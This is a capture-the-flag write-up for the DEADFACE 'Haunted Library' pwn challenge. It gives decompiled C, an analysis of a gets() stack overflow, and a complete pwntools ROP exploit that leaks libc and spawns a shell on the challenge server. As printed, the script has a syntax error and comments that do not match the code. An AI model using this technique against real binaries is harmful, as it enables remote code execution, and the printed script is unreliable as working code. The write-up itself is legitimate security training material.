DEADFACE appear to be using this program as a way to let potential new recruits view info on their server, while restricting access to more important files…
I tried my hand at it, but i didnt get too far before hitting a wall. I do have some discoveries that might help you, though:
1.) I dont think we’ll be able to put shellcode on the stack…
2.) getting started was a nightmare! but I found a program that makes it wayyy easier: [https://github.com/io12/pwninit](https://github.com/io12/pwninit)

---
We have a program that displays a menu with three options. The first lists available books, which are simply text files in the current directory. The second asks us to enter a book name and then prints the contents of that file. The third exits the program. Since the binary is not stripped of symbols, we can use any reverse-engineering tool to decompile it.

`main(0)`
```C
setvbuf(fp: __TMC_END__, buf: nullptr, mode: 2, size: 0)
setvbuf(fp: stdin, buf: nullptr, mode: 2, size: 0)
print_library()
puts(str: "=====================================")
puts(str: "Welcome to the Haunted Library...")
puts(str: "=====================================")

while (true)
    menu()
    printf(format: "> ")
    int32_t var_c
    
    if (__isoc23_scanf(0x402055, &var_c) != 1)
        puts(str: "The librarian doesn")
        exit(status: 1)
        noreturn
    
    getchar()
    int32_t rax_4 = var_c
    
    if (rax_4 == 3)
        break
    
    if (rax_4 == 1)
        peruse()
        continue
    else if (rax_4 == 2)
        checkout()
        continue
    
    puts(str: "Make up your mind!\n")

leave()
noreturn
```

`peruse()`
```C
puts(str: "\nYou wander the dusty shelves and see:")
DIR* dirp = opendir(name: ".")

if (dirp == 0)
    return puts(str: "But the shelves are empty...")

while (true)
    struct dirent64* rax_6 = readdir(dirp)
    
    if (rax_6 == 0)
        break
    
    if (rax_6->d_name[0] != 0x2e)
        printf(format: "- %s\n", &rax_6->d_name)

return closedir(dirp)
```

`checkout()`
```C
{
    puts("\nWhich book do you dare open?");
    printf("> ");
    char var_58[0x47];
    gets(&var_58);
    
    if (strcmp(&var_58, "BookOfTheDead.txt") && !strchr(&var_58, 0x2f)
        && !strstr(&var_58, ".."))
    {
        FILE* fp = fopen(&var_58, U"r");
        
        if (!fp)
            return printf(
                "\nYou could have sworn you saw a book called '%s'...\n \n but as you look "
            "closer, it was nowhere to be found.\n", 
                &var_58);
        
        printf("\n====== %s ======\n", &var_58);
        
        while (true)
        {
            char rax_10 = fgetc(fp);
            
            if (rax_10 == 0xff)
                break;
            
            putchar((int32_t)rax_10);
        }
        
        puts("\n================");
        return fclose(fp);
    }
    
    return puts("That tome is forbidden!!! The librarian's wrathful gaze burns into you. ");
}

```
some interesting observations about the `checkout()` function and the binary:
- uses `gets()` to take user input.
- we cannot open the `BookOfTheDead.txt` file, which likely contains the flag.  
- no stack canary, which will allow us overflow the input buffer.

the binary has NX enabled so we cannot use shellcode. we can use ROP chains, as the challenge provides us with libc and loader.

the function also has the function called `book_of_the_dead()` which is never called, that prints the address of the puts function. this will helps us calculate where libc is loaded in memory. luckily, PIE is disabled, so we can simply jump to this function.

our ROP chain will have two parts:
- payload 1
	- return to `book_of_the_dead()`.
	- calculate libc's base address.
	- return to `main` again.
- payload 2
	- call `gets` to read `/bin/bash` from the user.
	- call `system` with `/bin/bash` string.

before we write our exploit we can use `pwninit` to path our binary to use the local libc and loader.

final exploit:
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./hauntedlibrary_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']
script = '''
set disassembly-flavor intel
break main
b checkout
display/5i $rip
display/30xg $rsp
display/x $rdi
display/x $rsi
display/x $rdx
display/x $rcx
'''

def conn():
    if args.L:
        r = process([exe.path])
        if args.GDB:
            return gdb.debug(exe.path, gdbscript=script)
    else:
        r = remote("env02.deadface.io",7832)

    return r


def main():
    r = conn()
    offset = cyclic_find(0x6161617861616177)
    botd = p64(exe.sym['book_of_the_dead'])
    main = p64(exe.sym['main'])

    # payload 1 - leak buts and call main
    payload = [
            b'2\r',
            b'A'*offset,
            botd,
            main
            ]
    payload = b''.join(payload)
    r.sendline(payload)
    r.recvuntil(b'puts(): ')
    leak = r.recvn(14)
    leak = int(leak, 16)
    print("LEAK: " + str(hex(leak)))

	# calculate libc base and other addresses
    libcbase = leak - 0x82c80
    print("LIBCBASE: " + str(hex(libcbase)))

    pop_rdi = p64(libcbase + 0x0000000000102dea)
    pop_rsi = p64(libcbase + 0x0000000000053887)
    pop_rdx_xor_eax = p64(libcbase + 0x00000000000d77bd)
    pop_rcx_0 = p64(libcbase + 0x0000000000049513)

    system = p64(libcbase + libc.sym['system'])
    writable = p64(libcbase + 0x208000 + 0x1000 + 0x1000)
    gets = p64(exe.plt['gets'])

	# payload 2 - call read(buffer) (/bin/bash) and system(/bin/bash)
    payload = [
            b'2\r',
            b'A'*offset,
            pop_rdi,
            writable,
            gets,
            pop_rdi,
            writable,
            system,
            main
            ]
    payload = b''.join(payload)
    r.sendline(payload)
    r.sendline(b"/bin/bash")
	r.sendline(b'whoami)
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
```

